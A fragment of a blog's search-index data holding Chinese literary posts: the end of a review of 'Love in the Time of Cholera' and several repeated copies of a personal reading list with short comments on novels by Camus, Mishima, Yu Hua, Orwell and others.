作品内核分析再来看看作品的介绍“讲述了一段跨越半个多世纪的爱情史诗，穷尽了所有爱情的可能性”。 爱情是什么？为什么弗洛伦蒂诺在与622个女人发生过肉体关系的情况下，仍能对费尔明娜说出“我为你保留了童真”？ 因为两人长达52年的小心翼翼的互相确认。 费尔明娜在看似“幸福美满”的婚姻中意识到了弗洛伦蒂诺这个”幽灵“在她的脑海之中挥之不去，意识到了物质的富足并不等于爱情，意识到了这种看似已经被升华成亲情的爱情背后渗透着女人对物质满足感的本质的误判。**她享受着与胡维纳尔在人前扮演恩爱夫妻的满足感，享受着医生为她带来的安定生活，享受着抚养孩子的成就感，这种安心感被她误认为爱情。**可她却没有意识到，这一切与胡维纳尔医生本人并没有多大关系，任何一个同样物质条件的男人，都能给她这一切。 弗洛伦蒂诺则更是在一次又一次地确认着自己对费尔明娜的感情，他不断地与各种女人开启新的感情，只为了把费尔明娜”忘掉“，但一次又一次地试图遗忘，一次又一次地确认感情，一次又一次地失败，”忘不了“，更说明了弗洛伦蒂诺对费尔明娜的痴情。弗洛伦蒂诺一开始地疯狂写情书是他精神世界的一场幼稚的狂欢，是对理想化的神话的费尔明娜的追求，但是当费尔明娜真正嫁人之后，试图忘掉她也好，证明也罢，**弗洛伦蒂诺所经历的一切都在不断擦亮这场狂欢，不断为当年的幼稚加上成熟的注脚。他一次又一次开启新的感情，一次又一次意识到费尔明娜在他内心中的特殊地位，一次又一次迷失了自我。**这也使得最后弗洛伦蒂诺时隔51年的表白如此震撼人心。 那么，爱情是这本书的全部吗？ 很显然不是的，弗洛伦蒂诺为什么无法爱人，在他疯狂的寻花问柳的过程中，有不少女人爱上了他，他也有过多次的爱上她人的错觉。那又是什么让弗洛伦蒂诺无法达到结婚的现实呢？ 是孤独。 怪罪于“","date":"2022-01-18","objectID":"/articles/El-Amor-En-Los-Tiempos-Del-Colera/:0:0","series":null,"tags":null,"title":"怪罪于爱的孤独 《霍乱时期的爱情》书评","uri":"/articles/El-Amor-En-Los-Tiempos-Del-Colera/#写在后面"},{"categories":["文学"],"content":" 前言今天与人聊起看过的书，发现多年来虽然阅读量不少，却从没做过系统的整理，所以就有了这篇文章。初高中因为客观条件的限制，只能阅读纸质书，只记得总数很多，经过一个下午的回想，也没想起来多少，所以在这篇文章中出现的初高中读的作品都是印象很深刻的，很经典的作品，也算是变相筛掉了一些层次不高的消遣类读物吧。 评价标准我不止一次问自己，一本书打动我的究竟是什么，经过思考，我觉得可以大抵分为两类：“历史沧桑感”与“个人意识感染力”。在第一类书中，你能够感觉到作者表现出来的，某个时代，某个地区的人民的某种特殊的生存状态，能够感受到遥远的时空那端的人们与屏幕前的你的“精神共振”，看这种书的时候，你脑海里的想象画面是带着一层灰色滤镜的，因为作者时时刻刻都在传递着**“这不仅仅是小说，这反映的是那个时代的历史”**。在第二类书中，作者想要传递的是一种精神层面的震撼，一种个人意志的表达，这种小说的背景无关紧要，往往主角贯穿始终或者直接采用第一人称进行写作，甚至故事设置的时空背景与作者本人生活的时空背景相距甚远。但这不是重点，作者想要通过主角的经历，引发读者对某种精神困境的思考，越现代的小说往往越追求这种超时空的表达。任何一本书只要在以上两点中有任何一点打动我，在我这里它就是一本好书，这两点本身也没有高下之分。还有一类书无法归类到这两点中，这之后再说。 再来说说文风。文风上每个作家都各有特色，就我个人而言，我更偏好强剧情推动性的文字搭配简短的，想象空间高的环境描写。因为现代社会媒介已经很发达了，客观来讲，大段大段的环境描写已经对现代人失去了吸引力（尤其是翻译作品，连这种描写的韵味也在翻译的过程中丧失了）。我最喜欢什么样的文风呢，这里举个例子： 海滩上也是火热的阳光。大海在急速而憋闷地喘息着，层层细浪拍击着沙岸。我漫步走向那片岩石，感到脑袋在太阳照射下膨胀起来了。周围的酷热都聚焦在我的身上，叫我举步维艰。每一阵热风扑面而来，我就要咬紧牙关，攥紧裤口袋里的拳头，全身绷紧，为的是能战胜太阳与它倾泻给我的那种昏昏然的迷幻感。从沙砾上、从白色贝壳上、从玻璃碎片上，投射出来的反光像一道道利剑，刺得我睁不开眼，不得不牙关紧缩。就这样我走了好久。《局外人》阿尔贝·加缪 短促明快并且清晰地展现了默尔索先生在“行凶”前后所感受到的“荒诞感”，陀思妥耶夫斯基也是这种文风，如果不是因为俄国人的名字太长太难记，这里引用的就是他的书。如果给我的喜好做几个特征抽象的话，就是： 视角相对集中，最好使用第一人称 环境描写主观性要强，要对当前描写的对象的精神产生显著影响，并引导其之后的行为 说人话，翻译作品不应有太明显的翻译痕迹 再摘一段我很喜欢的描写： “刚才，在那边，有为子给宪兵抓走了。我们一起去看看吧！” 我趿拉着木屐跑去。月夜清明，收割后的稻田里随处能看到稻架清晰的影子。 小树林的树荫里聚集着黑压压的一群人，不停地蠕动着。有为子穿着黑制服，坐在地面上，面色煞白。身边站着四五个宪兵和她的父母。一个宪兵拿出饭盒般的东西，对她吼叫着。她父亲向宪兵百般示好，反复求情，不住责骂女儿。母亲在一旁痛哭流涕。 我们站在田畦上，隔着一块稻田眺望。看热闹的人越来越多，彼此肩膀挨着肩膀，默默无语。月亮也仿佛被压挤得缩小了，挂在我们头顶上。 同学对着我的耳朵叙说着。 有为子是在带着饭盒走出家门、打算到邻村去的当儿，被埋伏的宪兵抓到的。那饭盒显然是送给逃兵的。逃兵和有为子在海军医院亲近，后来，怀孕的有为子被医院赶出来了。宪兵问她那个逃兵躲在哪里，有为子坐着一动不动，顽固地一声不吭。…… 我呢，眼睛一眨不眨凝视着有为子的脸，她像一个被抓到的女疯子，月光之下，面孔毫无表情。我以前从未见过死不认罪的面孔，我想到了自己遭到世界拒绝的面孔。然而，有为子的面孔却是拒绝世界的。月光一个劲儿流泻在她的额头、眼睛、鼻梁和面颊上，那副纹丝不动的容颜只是被月光洗涤着。她只要眼睛倏忽一亮，稍稍扭动一下嘴角，她所拒绝的世界似乎就会顺势从那里涌流进去。 《金阁寺》三岛由纪夫 大概就是这样，我这个人很容易被带节奏，只要感情上能打动我，就是好文风！ 下面开始讲书（排名不分先后，已过滤课内必读书目） 推书！（文学性较强） 《活着》 【中】余华 实在太刀了，富贵一家最后已经惨的丧失真实性了（太惨了反而丧失了感染力），但是确确实实能感受到祖辈们在历史的潮流下身不由己地那种无奈。 《1984》 【英】乔治·奥威尔 “栗树荫下，我出卖你，你出卖我。” 这个是初中时候看的，描述了一个极端集权的社会。“公知圣经”，虽然从社会学角度，奥威尔设想的制度毫无可行性，但是生活在任何国家任何社会制度下的人都能在这本书中找到本国政府的影子。 《动物庄园》 【英】乔治·奥威尔 “动物生而平等，但有的动物更平等一些。” 一个预言故事，非常讽刺，一场革命的变质。 《黄金时代》《黑铁时代》《王仙客寻无双记》等等 【中】王小波 这两本书是王小波小说中我认为最有韵味的。前者讲了那个逻辑混乱充满激情的十年岁月，后者具有象征性的情节细品很有味道（虽然现在也一知半解）。 我个人非常非常非常喜欢。 《三体系列》 【中】刘慈欣 格局实在太大，时间线纵贯古今，给人带来强烈的震撼并开始思考自我的时代定位。看出了史诗的感觉。 《看不见的城市》 【意大利】伊塔洛·卡尔维诺 几百字的迷你短篇拼成的一本合集，描述了一个个存在于概念中的城市，具象化了作者的哲学思考。 城市是个很有意思的尺度，不大不小，与日常生活息息相关但又很难整体把握。想象站在某个城市第一高楼向下俯瞰的情景，这本身就令人心旷神怡。 《倾城之恋》 【中】张爱玲 张爱玲一直是我心目中的女小说家top1，无论是文笔还是情节构思都是极高水平，背景多为民国上海和香港，前文中说的两点兼而有之，非常厉害。 《人生的智慧》 【德】叔本华 这是随笔，解决的是实用问题，就这一点就比那些全是概念的哲学书可读多了，（我虽然看完了，但现在还是啥也想不起来。 《金色梦乡》 【日】伊坂幸太郎 非常有电影感的描写，非常治愈的故事，但是文风还是太白开水了，可能因为这不是纯文学吧。 《小径分岔的花园》 【阿根廷】博尔赫斯 博尔赫斯也是作家中的作家，全球性的作家，没得诺奖是诺奖的遗憾，但是这书实在是太晦涩了，情节也让人一头雾水，适合拿来摘抄装深沉而不是看。高情商：文辞隽永，低情商：不说人话。 《罪与罚》 【俄】陀思妥耶夫斯基 在各个方面都达到了相当高的水平，“好书推荐”标准答案之一，无数后来者模仿他的文风，对犯罪者的描写入木三分让人怀疑陀氏是不是也杀过人（？） 《恶意》 【日】东野圭吾 畅销君的书这里只放一本，因为这本阅读体验最好（？），还是老问题，文风白开水，可能因为不是纯文学吧。 《罗生门》 【日】芥川龙之介 那个年代的日本作家的文字总是透露出一种“在癫狂的边缘”的气质，《罗生门》是一本小说集，水平参差不齐，但是忧郁中带点狂气的感觉我很喜欢。 《理想国》 【古希腊】柏拉图 初中看的，几个哲学比喻很经典也很有意思，这种语录体的讨论哲学的作品散发着一种理性美。 《挪威的森林》 【日】村上春树 村上文字有一种沉浸感，就是冥冥中有一种力量吸引着读者一直往下看，即使现在的情节让你感觉很无聊。《挪》展现了当时日本年轻人对自我社会定位与爱情的迷茫，随便找一段看都很抓人。其中大量的性描写对当时还是初中的我造成了极大的震撼。 《舞！舞！舞！》 【日】村上春树 高度发达的资本主义社会中个人寻找自我的一场冒险。 《金阁寺》 【日】三岛由纪夫 三岛美学代表，忧郁中带着狂气的经典气质，文笔极好，阅读体验很流畅。 《假面的告白》 【日】三岛由纪夫 带有自传性质的小说，对主角的心理描写极为深刻和露骨，比如种种有背德感的想法等等，比较阴暗。 《个人的体验》 【日】大江健三郎 妻子快生孩子了，主角仍在梦想着实现个人梦想：去非洲。详细描写了个人在梦想与社会期望脱节的情况下的心理活动。（浙江高考题警告） 《了不起的盖茨比》 【美】弗·司各特·菲茨杰拉德 又一本各种意义上的世界名著，但对我的触动不大，留给我印象最深的意象是黛西的那盏“绿灯”，我认为它象征着对一个虚幻的人的爱。盖茨比爱黛西，但这个黛西是他想象出来的，是一种象征。这个象征很复杂，需要结合各路书评理解。（但是我看的时候就是get不到点啊 《美丽新世界》 【英】阿道司·赫胥黎 和《1984》一样同为反乌托邦三部曲，如果说《1984》里描述的社会形式已经离我们远去，那《美丽新世界》所描述的未来则完全有可能实现，带给读者关于随着科技进步，社会形态变迁的思考。 《被讨厌的勇气》 【日】岸见一郎/古贺史健 精神鸦片，但架不住好用呀！！！ 最emo的时候同学推的，看完感觉好多了。 《潮骚》 【日】三岛由纪夫 文笔极好的爱情故事，结局竟然是好的，这年头好结局的爱情故事不多见呀。 《女生徒》 【日】太宰治 男作家带入女性视角写作的短篇小说集，心理活动很细腻。 《荒原狼》 【德】赫尔曼·黑塞 这本书我专门写过一篇文章去谈。 《围城》 【中】钱钟书 讽刺很漂亮，看着很乐。 《三重门》 【中】韩寒 对《围城》模仿痕迹极为明显，但更现代，看着更乐。 《红高粱家族》 【中】莫言 极为深重的历史苍桑感，乡土化的魔幻现实主义的写法。 《檀香刑》 【中】莫言 给莫言的文笔跪了，这书情节上没啥厉害的，描写太厉害了，我个人不太喜欢看大段描写，但是莫言这书里的描写太强了，看着超带感。 《正红旗下》 【中】老舍 老舍先生语言大师，人民艺术家，看他的文字是种享受。 《局外人》 【法】阿尔贝·加缪 “法庭判你死刑，哲学证你无罪。“ 文风和情节都让我很喜欢，整体传达出的这种荒诞感很契合现代人的心理。 《脑","date":"2022-01-18","objectID":"/articles/share-books/:0:0","series":null,"tags":null,"title":"分享一些看过的书","uri":"/articles/share-books/#"},{"categories":["文学"],"content":" 前言今天与人聊起看过的书，发现多年来虽然阅读量不少，却从没做过系统的整理，所以就有了这篇文章。初高中因为客观条件的限制，只能阅读纸质书，只记得总数很多，经过一个下午的回想，也没想起来多少，所以在这篇文章中出现的初高中读的作品都是印象很深刻的，很经典的作品，也算是变相筛掉了一些层次不高的消遣类读物吧。 评价标准我不止一次问自己，一本书打动我的究竟是什么，经过思考，我觉得可以大抵分为两类：“历史沧桑感”与“个人意识感染力”。在第一类书中，你能够感觉到作者表现出来的，某个时代，某个地区的人民的某种特殊的生存状态，能够感受到遥远的时空那端的人们与屏幕前的你的“精神共振”，看这种书的时候，你脑海里的想象画面是带着一层灰色滤镜的，因为作者时时刻刻都在传递着**“这不仅仅是小说，这反映的是那个时代的历史”**。在第二类书中，作者想要传递的是一种精神层面的震撼，一种个人意志的表达，这种小说的背景无关紧要，往往主角贯穿始终或者直接采用第一人称进行写作，甚至故事设置的时空背景与作者本人生活的时空背景相距甚远。但这不是重点，作者想要通过主角的经历，引发读者对某种精神困境的思考，越现代的小说往往越追求这种超时空的表达。任何一本书只要在以上两点中有任何一点打动我，在我这里它就是一本好书，这两点本身也没有高下之分。还有一类书无法归类到这两点中，这之后再说。 再来说说文风。文风上每个作家都各有特色，就我个人而言，我更偏好强剧情推动性的文字搭配简短的，想象空间高的环境描写。因为现代社会媒介已经很发达了，客观来讲，大段大段的环境描写已经对现代人失去了吸引力（尤其是翻译作品，连这种描写的韵味也在翻译的过程中丧失了）。我最喜欢什么样的文风呢，这里举个例子： 海滩上也是火热的阳光。大海在急速而憋闷地喘息着，层层细浪拍击着沙岸。我漫步走向那片岩石，感到脑袋在太阳照射下膨胀起来了。周围的酷热都聚焦在我的身上，叫我举步维艰。每一阵热风扑面而来，我就要咬紧牙关，攥紧裤口袋里的拳头，全身绷紧，为的是能战胜太阳与它倾泻给我的那种昏昏然的迷幻感。从沙砾上、从白色贝壳上、从玻璃碎片上，投射出来的反光像一道道利剑，刺得我睁不开眼，不得不牙关紧缩。就这样我走了好久。《局外人》阿尔贝·加缪 短促明快并且清晰地展现了默尔索先生在“行凶”前后所感受到的“荒诞感”，陀思妥耶夫斯基也是这种文风，如果不是因为俄国人的名字太长太难记，这里引用的就是他的书。如果给我的喜好做几个特征抽象的话，就是： 视角相对集中，最好使用第一人称 环境描写主观性要强，要对当前描写的对象的精神产生显著影响，并引导其之后的行为 说人话，翻译作品不应有太明显的翻译痕迹 再摘一段我很喜欢的描写： “刚才，在那边，有为子给宪兵抓走了。我们一起去看看吧！” 我趿拉着木屐跑去。月夜清明，收割后的稻田里随处能看到稻架清晰的影子。 小树林的树荫里聚集着黑压压的一群人，不停地蠕动着。有为子穿着黑制服，坐在地面上，面色煞白。身边站着四五个宪兵和她的父母。一个宪兵拿出饭盒般的东西，对她吼叫着。她父亲向宪兵百般示好，反复求情，不住责骂女儿。母亲在一旁痛哭流涕。 我们站在田畦上，隔着一块稻田眺望。看热闹的人越来越多，彼此肩膀挨着肩膀，默默无语。月亮也仿佛被压挤得缩小了，挂在我们头顶上。 同学对着我的耳朵叙说着。 有为子是在带着饭盒走出家门、打算到邻村去的当儿，被埋伏的宪兵抓到的。那饭盒显然是送给逃兵的。逃兵和有为子在海军医院亲近，后来，怀孕的有为子被医院赶出来了。宪兵问她那个逃兵躲在哪里，有为子坐着一动不动，顽固地一声不吭。…… 我呢，眼睛一眨不眨凝视着有为子的脸，她像一个被抓到的女疯子，月光之下，面孔毫无表情。我以前从未见过死不认罪的面孔，我想到了自己遭到世界拒绝的面孔。然而，有为子的面孔却是拒绝世界的。月光一个劲儿流泻在她的额头、眼睛、鼻梁和面颊上，那副纹丝不动的容颜只是被月光洗涤着。她只要眼睛倏忽一亮，稍稍扭动一下嘴角，她所拒绝的世界似乎就会顺势从那里涌流进去。 《金阁寺》三岛由纪夫 大概就是这样，我这个人很容易被带节奏，只要感情上能打动我，就是好文风！ 下面开始讲书（排名不分先后，已过滤课内必读书目） 推书！（文学性较强） 《活着》 【中】余华 实在太刀了，富贵一家最后已经惨的丧失真实性了（太惨了反而丧失了感染力），但是确确实实能感受到祖辈们在历史的潮流下身不由己地那种无奈。 《1984》 【英】乔治·奥威尔 “栗树荫下，我出卖你，你出卖我。” 这个是初中时候看的，描述了一个极端集权的社会。“公知圣经”，虽然从社会学角度，奥威尔设想的制度毫无可行性，但是生活在任何国家任何社会制度下的人都能在这本书中找到本国政府的影子。 《动物庄园》 【英】乔治·奥威尔 “动物生而平等，但有的动物更平等一些。” 一个预言故事，非常讽刺，一场革命的变质。 《黄金时代》《黑铁时代》《王仙客寻无双记》等等 【中】王小波 这两本书是王小波小说中我认为最有韵味的。前者讲了那个逻辑混乱充满激情的十年岁月，后者具有象征性的情节细品很有味道（虽然现在也一知半解）。 我个人非常非常非常喜欢。 《三体系列》 【中】刘慈欣 格局实在太大，时间线纵贯古今，给人带来强烈的震撼并开始思考自我的时代定位。看出了史诗的感觉。 《看不见的城市》 【意大利】伊塔洛·卡尔维诺 几百字的迷你短篇拼成的一本合集，描述了一个个存在于概念中的城市，具象化了作者的哲学思考。 城市是个很有意思的尺度，不大不小，与日常生活息息相关但又很难整体把握。想象站在某个城市第一高楼向下俯瞰的情景，这本身就令人心旷神怡。 《倾城之恋》 【中】张爱玲 张爱玲一直是我心目中的女小说家top1，无论是文笔还是情节构思都是极高水平，背景多为民国上海和香港，前文中说的两点兼而有之，非常厉害。 《人生的智慧》 【德】叔本华 这是随笔，解决的是实用问题，就这一点就比那些全是概念的哲学书可读多了，（我虽然看完了，但现在还是啥也想不起来。 《金色梦乡》 【日】伊坂幸太郎 非常有电影感的描写，非常治愈的故事，但是文风还是太白开水了，可能因为这不是纯文学吧。 《小径分岔的花园》 【阿根廷】博尔赫斯 博尔赫斯也是作家中的作家，全球性的作家，没得诺奖是诺奖的遗憾，但是这书实在是太晦涩了，情节也让人一头雾水，适合拿来摘抄装深沉而不是看。高情商：文辞隽永，低情商：不说人话。 《罪与罚》 【俄】陀思妥耶夫斯基 在各个方面都达到了相当高的水平，“好书推荐”标准答案之一，无数后来者模仿他的文风，对犯罪者的描写入木三分让人怀疑陀氏是不是也杀过人（？） 《恶意》 【日】东野圭吾 畅销君的书这里只放一本，因为这本阅读体验最好（？），还是老问题，文风白开水，可能因为不是纯文学吧。 《罗生门》 【日】芥川龙之介 那个年代的日本作家的文字总是透露出一种“在癫狂的边缘”的气质，《罗生门》是一本小说集，水平参差不齐，但是忧郁中带点狂气的感觉我很喜欢。 《理想国》 【古希腊】柏拉图 初中看的，几个哲学比喻很经典也很有意思，这种语录体的讨论哲学的作品散发着一种理性美。 《挪威的森林》 【日】村上春树 村上文字有一种沉浸感，就是冥冥中有一种力量吸引着读者一直往下看，即使现在的情节让你感觉很无聊。《挪》展现了当时日本年轻人对自我社会定位与爱情的迷茫，随便找一段看都很抓人。其中大量的性描写对当时还是初中的我造成了极大的震撼。 《舞！舞！舞！》 【日】村上春树 高度发达的资本主义社会中个人寻找自我的一场冒险。 《金阁寺》 【日】三岛由纪夫 三岛美学代表，忧郁中带着狂气的经典气质，文笔极好，阅读体验很流畅。 《假面的告白》 【日】三岛由纪夫 带有自传性质的小说，对主角的心理描写极为深刻和露骨，比如种种有背德感的想法等等，比较阴暗。 《个人的体验》 【日】大江健三郎 妻子快生孩子了，主角仍在梦想着实现个人梦想：去非洲。详细描写了个人在梦想与社会期望脱节的情况下的心理活动。（浙江高考题警告） 《了不起的盖茨比》 【美】弗·司各特·菲茨杰拉德 又一本各种意义上的世界名著，但对我的触动不大，留给我印象最深的意象是黛西的那盏“绿灯”，我认为它象征着对一个虚幻的人的爱。盖茨比爱黛西，但这个黛西是他想象出来的，是一种象征。这个象征很复杂，需要结合各路书评理解。（但是我看的时候就是get不到点啊 《美丽新世界》 【英】阿道司·赫胥黎 和《1984》一样同为反乌托邦三部曲，如果说《1984》里描述的社会形式已经离我们远去，那《美丽新世界》所描述的未来则完全有可能实现，带给读者关于随着科技进步，社会形态变迁的思考。 《被讨厌的勇气》 【日】岸见一郎/古贺史健 精神鸦片，但架不住好用呀！！！ 最emo的时候同学推的，看完感觉好多了。 《潮骚》 【日】三岛由纪夫 文笔极好的爱情故事，结局竟然是好的，这年头好结局的爱情故事不多见呀。 《女生徒》 【日】太宰治 男作家带入女性视角写作的短篇小说集，心理活动很细腻。 《荒原狼》 【德】赫尔曼·黑塞 这本书我专门写过一篇文章去谈。 《围城》 【中】钱钟书 讽刺很漂亮，看着很乐。 《三重门》 【中】韩寒 对《围城》模仿痕迹极为明显，但更现代，看着更乐。 《红高粱家族》 【中】莫言 极为深重的历史苍桑感，乡土化的魔幻现实主义的写法。 《檀香刑》 【中】莫言 给莫言的文笔跪了，这书情节上没啥厉害的，描写太厉害了，我个人不太喜欢看大段描写，但是莫言这书里的描写太强了，看着超带感。 《正红旗下》 【中】老舍 老舍先生语言大师，人民艺术家，看他的文字是种享受。 《局外人》 【法】阿尔贝·加缪 “法庭判你死刑，哲学证你无罪。“ 文风和情节都让我很喜欢，整体传达出的这种荒诞感很契合现代人的心理。 《脑","date":"2022-01-18","objectID":"/articles/share-books/:0:0","series":null,"tags":null,"title":"分享一些看过的书","uri":"/articles/share-books/#前言"},{"categories":["文学"],"content":" 前言今天与人聊起看过的书，发现多年来虽然阅读量不少，却从没做过系统的整理，所以就有了这篇文章。初高中因为客观条件的限制，只能阅读纸质书，只记得总数很多，经过一个下午的回想，也没想起来多少，所以在这篇文章中出现的初高中读的作品都是印象很深刻的，很经典的作品，也算是变相筛掉了一些层次不高的消遣类读物吧。 评价标准我不止一次问自己，一本书打动我的究竟是什么，经过思考，我觉得可以大抵分为两类：“历史沧桑感”与“个人意识感染力”。在第一类书中，你能够感觉到作者表现出来的，某个时代，某个地区的人民的某种特殊的生存状态，能够感受到遥远的时空那端的人们与屏幕前的你的“精神共振”，看这种书的时候，你脑海里的想象画面是带着一层灰色滤镜的，因为作者时时刻刻都在传递着**“这不仅仅是小说，这反映的是那个时代的历史”**。在第二类书中，作者想要传递的是一种精神层面的震撼，一种个人意志的表达，这种小说的背景无关紧要，往往主角贯穿始终或者直接采用第一人称进行写作，甚至故事设置的时空背景与作者本人生活的时空背景相距甚远。但这不是重点，作者想要通过主角的经历，引发读者对某种精神困境的思考，越现代的小说往往越追求这种超时空的表达。任何一本书只要在以上两点中有任何一点打动我，在我这里它就是一本好书，这两点本身也没有高下之分。还有一类书无法归类到这两点中，这之后再说。 再来说说文风。文风上每个作家都各有特色，就我个人而言，我更偏好强剧情推动性的文字搭配简短的，想象空间高的环境描写。因为现代社会媒介已经很发达了，客观来讲，大段大段的环境描写已经对现代人失去了吸引力（尤其是翻译作品，连这种描写的韵味也在翻译的过程中丧失了）。我最喜欢什么样的文风呢，这里举个例子： 海滩上也是火热的阳光。大海在急速而憋闷地喘息着，层层细浪拍击着沙岸。我漫步走向那片岩石，感到脑袋在太阳照射下膨胀起来了。周围的酷热都聚焦在我的身上，叫我举步维艰。每一阵热风扑面而来，我就要咬紧牙关，攥紧裤口袋里的拳头，全身绷紧，为的是能战胜太阳与它倾泻给我的那种昏昏然的迷幻感。从沙砾上、从白色贝壳上、从玻璃碎片上，投射出来的反光像一道道利剑，刺得我睁不开眼，不得不牙关紧缩。就这样我走了好久。《局外人》阿尔贝·加缪 短促明快并且清晰地展现了默尔索先生在“行凶”前后所感受到的“荒诞感”，陀思妥耶夫斯基也是这种文风，如果不是因为俄国人的名字太长太难记，这里引用的就是他的书。如果给我的喜好做几个特征抽象的话，就是： 视角相对集中，最好使用第一人称 环境描写主观性要强，要对当前描写的对象的精神产生显著影响，并引导其之后的行为 说人话，翻译作品不应有太明显的翻译痕迹 再摘一段我很喜欢的描写： “刚才，在那边，有为子给宪兵抓走了。我们一起去看看吧！” 我趿拉着木屐跑去。月夜清明，收割后的稻田里随处能看到稻架清晰的影子。 小树林的树荫里聚集着黑压压的一群人，不停地蠕动着。有为子穿着黑制服，坐在地面上，面色煞白。身边站着四五个宪兵和她的父母。一个宪兵拿出饭盒般的东西，对她吼叫着。她父亲向宪兵百般示好，反复求情，不住责骂女儿。母亲在一旁痛哭流涕。 我们站在田畦上，隔着一块稻田眺望。看热闹的人越来越多，彼此肩膀挨着肩膀，默默无语。月亮也仿佛被压挤得缩小了，挂在我们头顶上。 同学对着我的耳朵叙说着。 有为子是在带着饭盒走出家门、打算到邻村去的当儿，被埋伏的宪兵抓到的。那饭盒显然是送给逃兵的。逃兵和有为子在海军医院亲近，后来，怀孕的有为子被医院赶出来了。宪兵问她那个逃兵躲在哪里，有为子坐着一动不动，顽固地一声不吭。…… 我呢，眼睛一眨不眨凝视着有为子的脸，她像一个被抓到的女疯子，月光之下，面孔毫无表情。我以前从未见过死不认罪的面孔，我想到了自己遭到世界拒绝的面孔。然而，有为子的面孔却是拒绝世界的。月光一个劲儿流泻在她的额头、眼睛、鼻梁和面颊上，那副纹丝不动的容颜只是被月光洗涤着。她只要眼睛倏忽一亮，稍稍扭动一下嘴角，她所拒绝的世界似乎就会顺势从那里涌流进去。 《金阁寺》三岛由纪夫 大概就是这样，我这个人很容易被带节奏，只要感情上能打动我，就是好文风！ 下面开始讲书（排名不分先后，已过滤课内必读书目） 推书！（文学性较强） 《活着》 【中】余华 实在太刀了，富贵一家最后已经惨的丧失真实性了（太惨了反而丧失了感染力），但是确确实实能感受到祖辈们在历史的潮流下身不由己地那种无奈。 《1984》 【英】乔治·奥威尔 “栗树荫下，我出卖你，你出卖我。” 这个是初中时候看的，描述了一个极端集权的社会。“公知圣经”，虽然从社会学角度，奥威尔设想的制度毫无可行性，但是生活在任何国家任何社会制度下的人都能在这本书中找到本国政府的影子。 《动物庄园》 【英】乔治·奥威尔 “动物生而平等，但有的动物更平等一些。” 一个预言故事，非常讽刺，一场革命的变质。 《黄金时代》《黑铁时代》《王仙客寻无双记》等等 【中】王小波 这两本书是王小波小说中我认为最有韵味的。前者讲了那个逻辑混乱充满激情的十年岁月，后者具有象征性的情节细品很有味道（虽然现在也一知半解）。 我个人非常非常非常喜欢。 《三体系列》 【中】刘慈欣 格局实在太大，时间线纵贯古今，给人带来强烈的震撼并开始思考自我的时代定位。看出了史诗的感觉。 《看不见的城市》 【意大利】伊塔洛·卡尔维诺 几百字的迷你短篇拼成的一本合集，描述了一个个存在于概念中的城市，具象化了作者的哲学思考。 城市是个很有意思的尺度，不大不小，与日常生活息息相关但又很难整体把握。想象站在某个城市第一高楼向下俯瞰的情景，这本身就令人心旷神怡。 《倾城之恋》 【中】张爱玲 张爱玲一直是我心目中的女小说家top1，无论是文笔还是情节构思都是极高水平，背景多为民国上海和香港，前文中说的两点兼而有之，非常厉害。 《人生的智慧》 【德】叔本华 这是随笔，解决的是实用问题，就这一点就比那些全是概念的哲学书可读多了，（我虽然看完了，但现在还是啥也想不起来。 《金色梦乡》 【日】伊坂幸太郎 非常有电影感的描写，非常治愈的故事，但是文风还是太白开水了，可能因为这不是纯文学吧。 《小径分岔的花园》 【阿根廷】博尔赫斯 博尔赫斯也是作家中的作家，全球性的作家，没得诺奖是诺奖的遗憾，但是这书实在是太晦涩了，情节也让人一头雾水，适合拿来摘抄装深沉而不是看。高情商：文辞隽永，低情商：不说人话。 《罪与罚》 【俄】陀思妥耶夫斯基 在各个方面都达到了相当高的水平，“好书推荐”标准答案之一，无数后来者模仿他的文风，对犯罪者的描写入木三分让人怀疑陀氏是不是也杀过人（？） 《恶意》 【日】东野圭吾 畅销君的书这里只放一本，因为这本阅读体验最好（？），还是老问题，文风白开水，可能因为不是纯文学吧。 《罗生门》 【日】芥川龙之介 那个年代的日本作家的文字总是透露出一种“在癫狂的边缘”的气质，《罗生门》是一本小说集，水平参差不齐，但是忧郁中带点狂气的感觉我很喜欢。 《理想国》 【古希腊】柏拉图 初中看的，几个哲学比喻很经典也很有意思，这种语录体的讨论哲学的作品散发着一种理性美。 《挪威的森林》 【日】村上春树 村上文字有一种沉浸感，就是冥冥中有一种力量吸引着读者一直往下看，即使现在的情节让你感觉很无聊。《挪》展现了当时日本年轻人对自我社会定位与爱情的迷茫，随便找一段看都很抓人。其中大量的性描写对当时还是初中的我造成了极大的震撼。 《舞！舞！舞！》 【日】村上春树 高度发达的资本主义社会中个人寻找自我的一场冒险。 《金阁寺》 【日】三岛由纪夫 三岛美学代表，忧郁中带着狂气的经典气质，文笔极好，阅读体验很流畅。 《假面的告白》 【日】三岛由纪夫 带有自传性质的小说，对主角的心理描写极为深刻和露骨，比如种种有背德感的想法等等，比较阴暗。 《个人的体验》 【日】大江健三郎 妻子快生孩子了，主角仍在梦想着实现个人梦想：去非洲。详细描写了个人在梦想与社会期望脱节的情况下的心理活动。（浙江高考题警告） 《了不起的盖茨比》 【美】弗·司各特·菲茨杰拉德 又一本各种意义上的世界名著，但对我的触动不大，留给我印象最深的意象是黛西的那盏“绿灯”，我认为它象征着对一个虚幻的人的爱。盖茨比爱黛西，但这个黛西是他想象出来的，是一种象征。这个象征很复杂，需要结合各路书评理解。（但是我看的时候就是get不到点啊 《美丽新世界》 【英】阿道司·赫胥黎 和《1984》一样同为反乌托邦三部曲，如果说《1984》里描述的社会形式已经离我们远去，那《美丽新世界》所描述的未来则完全有可能实现，带给读者关于随着科技进步，社会形态变迁的思考。 《被讨厌的勇气》 【日】岸见一郎/古贺史健 精神鸦片，但架不住好用呀！！！ 最emo的时候同学推的，看完感觉好多了。 《潮骚》 【日】三岛由纪夫 文笔极好的爱情故事，结局竟然是好的，这年头好结局的爱情故事不多见呀。 《女生徒》 【日】太宰治 男作家带入女性视角写作的短篇小说集，心理活动很细腻。 《荒原狼》 【德】赫尔曼·黑塞 这本书我专门写过一篇文章去谈。 《围城》 【中】钱钟书 讽刺很漂亮，看着很乐。 《三重门》 【中】韩寒 对《围城》模仿痕迹极为明显，但更现代，看着更乐。 《红高粱家族》 【中】莫言 极为深重的历史苍桑感，乡土化的魔幻现实主义的写法。 《檀香刑》 【中】莫言 给莫言的文笔跪了，这书情节上没啥厉害的，描写太厉害了，我个人不太喜欢看大段描写，但是莫言这书里的描写太强了，看着超带感。 《正红旗下》 【中】老舍 老舍先生语言大师，人民艺术家，看他的文字是种享受。 《局外人》 【法】阿尔贝·加缪 “法庭判你死刑，哲学证你无罪。“ 文风和情节都让我很喜欢，整体传达出的这种荒诞感很契合现代人的心理。 